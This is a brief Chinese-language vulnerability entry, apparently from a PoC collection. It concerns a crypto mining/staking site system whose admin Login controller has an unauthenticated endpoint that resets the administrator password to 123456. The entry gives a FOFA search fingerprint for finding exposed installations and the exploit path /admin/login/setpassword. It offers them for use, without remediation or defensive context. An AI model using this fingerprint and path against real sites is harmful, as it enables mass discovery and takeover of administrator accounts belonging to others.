# 某U挖矿质押单语言系统前台未授权修改管理员密码

位于 /admin/controller/Login.php 有个很明显操纵SQL的update操作，重置了管理员的密码为123456，且未设置鉴权，非常明显是个后门

## fofa

```java
"/static/index/css/login/framework7.ios.min.css"
```

## poc

```
/admin/login/setpassword
```

![图片](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408281245679.webp)



## 漏洞来源

- https://mp.weixin.qq.com/s/EL-1pxjTNUS5fAKVX1zlrQ